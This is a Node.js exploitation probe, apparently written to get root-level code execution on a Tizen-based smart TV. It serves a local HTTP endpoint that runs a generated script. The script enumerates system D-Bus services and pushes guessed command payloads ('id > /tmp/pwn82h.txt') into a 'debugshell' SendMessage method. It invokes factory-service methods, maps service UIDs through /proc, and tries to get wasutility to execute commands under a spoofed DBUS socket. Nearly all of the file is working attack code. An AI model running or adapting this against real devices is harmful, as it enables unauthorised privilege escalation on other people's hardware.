'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8171;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe82h.txt';
var PWN = '/tmp/pwn82h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Full debugshell interface (not truncated)
  'try {',
  '  var o = cp.spawnSync("gdbus", ["introspect","--system","--dest","viola.ser.server.MessageRouter.debugshell_C.message","--object-path","/viola/ser/server/MessageRouter/debugshell_C/message"], {timeout:8000});',
  '  r.debugshell_full = (o.stdout||Buffer.from("")).toString().trim();',
  '} catch(e) { r.debugshell_full_err = e.message.slice(0,100); }',

  // 2. Try SendMessage with type hints (u for uint32, s for string)
  // Try a few key codes and meaningful type strings
  'var tries = [',
  '  [0, "exec"], [0, "shell"], [0, "cmd"],',
  '  [1, "exec"], [1, "shell"], [1, "cmd"],',
  '  [100, "exec"], [100, "shell"],',
  '  [0, "debug"], [0, "run"]',
  '];',
  'r.debugshell_tries = {};',
  'tries.forEach(function(t) {',
  '  var key = "c" + t[0] + "_" + t[1];',
  '  try {',
  '    var o2 = cp.spawnSync("gdbus", [',
  '      "call","--system","--dest","viola.ser.server.MessageRouter.debugshell_C.message",',
  '      "--object-path","/viola/ser/server/MessageRouter/debugshell_C/message",',
  '      "--method","viola.ser.server.MessageRouter.debugshell_C.message.SendMessage",',
  '      "string:me", "uint32:" + t[0], "string:" + t[1], "string:id > ' + PWN + '"',
  '    ], {timeout:4000});',
  '    r.debugshell_tries[key] = {',
  '      status: o2.status,',
  '      out: (o2.stdout||Buffer.from("")).toString().trim().slice(0,100),',
  '      err: (o2.stderr||Buffer.from("")).toString().trim().slice(0,80)',
  '    };',
  '  } catch(e) { r.debugshell_tries[key] = e.message.slice(0,60); }',
  '});',

  // 3. Check pwn after debugshell attempts
  'try { r.pwn1 = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  // 4. Full factory service interface at /TIFacSerObj
  'try {',
  '  var o3 = cp.spawnSync("gdbus", ["introspect","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--recurse"], {timeout:8000});',
  '  r.factory_full = (o3.stdout||Buffer.from("")).toString().trim();',
  '} catch(e) { r.factory_full_err = e.message.slice(0,100); }',

  // 5. Check factory process UID
  'try {',
  '  r.factory_proc = null;',
  '  var pidlist = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '  for (var i = 0; i < pidlist.length; i++) {',
  '    try {',
  '      var comm = fs.readFileSync("/proc/" + pidlist[i] + "/comm", "utf8").trim();',
  '      if (comm.indexOf("factory") > -1 || comm.indexOf("TIFac") > -1 || comm.indexOf("tifac") > -1 || comm.indexOf("facservice") > -1) {',
  '        var st = fs.readFileSync("/proc/" + pidlist[i] + "/status", "utf8");',
  '        var uid_m = st.match(/^Uid:\\t(\\d+)/m);',
  '        r.factory_proc = { pid: pidlist[i], comm: comm, uid: uid_m ? uid_m[1] : "?" };',
  '        break;',
  '      }',
  '    } catch(e) {}',
  '  }',
  '} catch(e) {}',

  // 6. Try calling factory methods
  'r.factory_calls = {};',
  'try {',
  '  var o4 = cp.spawnSync("gdbus", ["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.FacAppStart"], {timeout:5000});',
  '  r.factory_calls.FacAppStart = { status: o4.status, out: (o4.stdout||Buffer.from("")).toString().trim().slice(0,200), err: (o4.stderr||Buffer.from("")).toString().trim().slice(0,100) };',
  '} catch(e) { r.factory_calls.FacAppStart_err = e.message.slice(0,60); }',
  'try {',
  '  var o5 = cp.spawnSync("gdbus", ["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetHotelModeInfo"], {timeout:5000});',
  '  r.factory_calls.GetHotelModeInfo = { status: o5.status, out: (o5.stdout||Buffer.from("")).toString().trim().slice(0,200), err: (o5.stderr||Buffer.from("")).toString().trim().slice(0,100) };',
  '} catch(e) { r.factory_calls.GetHotelModeInfo_err = e.message.slice(0,60); }',
  'try {',
  '  var o6 = cp.spawnSync("gdbus", ["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetStrItem","int32:0"], {timeout:5000});',
  '  r.factory_calls.GetStrItem = { status: o6.status, out: (o6.stdout||Buffer.from("")).toString().trim().slice(0,200), err: (o6.stderr||Buffer.from("")).toString().trim().slice(0,100) };',
  '} catch(e) { r.factory_calls.GetStrItem_err = e.message.slice(0,60); }',

  // 7. Check viola/debugshell process UID
  'try {',
  '  r.viola_procs = [];',
  '  var pidlist2 = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '  for (var j = 0; j < pidlist2.length; j++) {',
  '    try {',
  '      var cmdl = fs.readFileSync("/proc/" + pidlist2[j] + "/cmdline", "utf8");',
  '      if (cmdl.indexOf("viola") > -1 || cmdl.indexOf("debugshell") > -1 || cmdl.indexOf("MessageRouter") > -1 || cmdl.indexOf("msgr") > -1) {',
  '        var st2 = fs.readFileSync("/proc/" + pidlist2[j] + "/status", "utf8");',
  '        var uid2 = st2.match(/^Uid:\\t(\\d+)/m);',
  '        r.viola_procs.push({ pid: pidlist2[j], cmd: cmdl.replace(/\\0/g," ").slice(0,100), uid: uid2 ? uid2[1] : "?" });',
  '      }',
  '    } catch(e) {}',
  '  }',
  '} catch(e) {}',

  // 8. Find the actual service binary for debugshell_C (search /usr/bin, /usr/sbin, /opt)
  'try {',
  '  var o7 = cp.spawnSync("/bin/sh", ["-c", "ls /usr/bin/ /usr/sbin/ 2>/dev/null | grep -i viola; ls /usr/bin/ /usr/sbin/ 2>/dev/null | grep -i debug; ls /usr/bin/ /usr/sbin/ 2>/dev/null | grep -i msgr; ls /usr/bin/ /usr/sbin/ 2>/dev/null | grep -i router"], {timeout:5000});',
  '  r.viola_bins = (o7.stdout||Buffer.from("")).toString().trim().slice(0,500);',
  '} catch(e) {}',

  // 9. Check /usr/bin/wasutility caller check path:
  //    Try: set DBUS_SYSTEM_BUS_ADDRESS to a fake socket path and see if wasutility falls back
  'try {',
  '  var env3 = {};',
  '  Object.keys(process.env).forEach(function(k){ env3[k] = process.env[k]; });',
  '  env3.DBUS_SYSTEM_BUS_ADDRESS = "unix:path=/tmp/fake_dbus.sock";',
  '  var o8 = cp.spawnSync("/usr/bin/wasutility", ["-e", "id > ' + PWN + '.was"], { timeout:5000, env: env3 });',
  '  r.was_fake_dbus = { status: o8.status, out: ((o8.stdout||Buffer.from("")).toString()+(o8.stderr||Buffer.from("")).toString()).trim().slice(0,200) };',
  '  try { r.was_fake_pwn = fs.readFileSync("' + PWN + '.was","utf8").trim(); } catch(e) {}',
  '} catch(e) { r.was_fake_dbus_err = e.message.slice(0,60); }',

  // 10. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 120000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
